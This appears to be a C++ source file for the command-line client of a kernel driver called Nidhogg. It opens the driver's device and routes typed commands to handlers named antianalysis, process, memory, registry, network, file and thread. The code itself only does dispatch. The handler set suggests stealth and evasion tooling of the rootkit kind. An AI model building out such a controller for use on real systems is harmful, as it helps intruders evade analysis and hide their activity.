#include "pch.h"
#include "NidhoggInterface.h"

NidhoggInterface::NidhoggInterface() {
	hNidhogg = std::make_shared<HANDLE>(CreateFileW(NIDHOGG_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr));

	if (!IsValidHandle(hNidhogg.get()))
		throw NidhoggInterfaceException("Failed to open Nidhogg device " + std::to_string(GetLastError()));
	commandHandlers["antianalysis"] = std::make_unique<AntiAnalysisHandler>(hNidhogg);
	commandHandlers["file"] = std::make_unique<FileHandler>(hNidhogg);
	commandHandlers["memory"] = std::make_unique<MemoryHandler>(hNidhogg);
	commandHandlers["network"] = std::make_unique<NetworkHandler>(hNidhogg);
	commandHandlers["process"] = std::make_unique<ProcessHandler>(hNidhogg);
	commandHandlers["registry"] = std::make_unique<RegistryHandler>(hNidhogg);
	commandHandlers["thread"] = std::make_unique<ThreadHandler>(hNidhogg);
}

NidhoggInterface::~NidhoggInterface() {
	if (IsValidHandle(hNidhogg.get()))
		CloseHandle(hNidhogg.get());
}

/*
* Description:
* HandleCommands is responsible for handling user commands in the Nidhogg interface.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void NidhoggInterface::HandleCommands() {
	bool exit = false;
	std::string command = "";

	while (!exit) {
		std::cout << termcolor::magenta << "[Nidhogg :: Main]>> " << termcolor::reset;
		std::getline(std::cin, command);
		ToLower(command);

		if (command.compare("exit") == 0)
			exit = true;
		else if (command.empty() || command.compare("help") == 0) {
			std::cout << termcolor::underline << termcolor::bright_magenta << "Available handlers:" << termcolor::reset << std::endl;

			for (const auto& handler : commandHandlers) {
				std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << handler.first << std::endl;
			}
			continue;
		}
		else if (commandHandlers.find(command) != commandHandlers.end()) {
			exit = commandHandlers[command]->GetCommand();
		}
		else {
			std::cout << "Invalid handler '" << command << "'" << std::endl << "Available handlers: " << std::endl;

			for (const auto& handler : commandHandlers) {
				std::cout << "\t[*] " << handler.first << std::endl;
			}
			continue;
		}
	}
}

void NidhoggInterface::HandleCommand(_In_ std::string handler, _In_ std::string command) {
	if (command.compare("exit") == 0)
		return;
	if (commandHandlers.find(handler) != commandHandlers.end()) {
		commandHandlers[handler]->GetCommand(command);
	}
	else {
		std::cout << "Invalid handler '" << handler << "'" << std::endl;
		std::cout << "Available handlers: " << std::endl;

		for (const auto& handler : commandHandlers) {
			std::cout << "\t[*] " << handler.first << std::endl;
		}
	}
}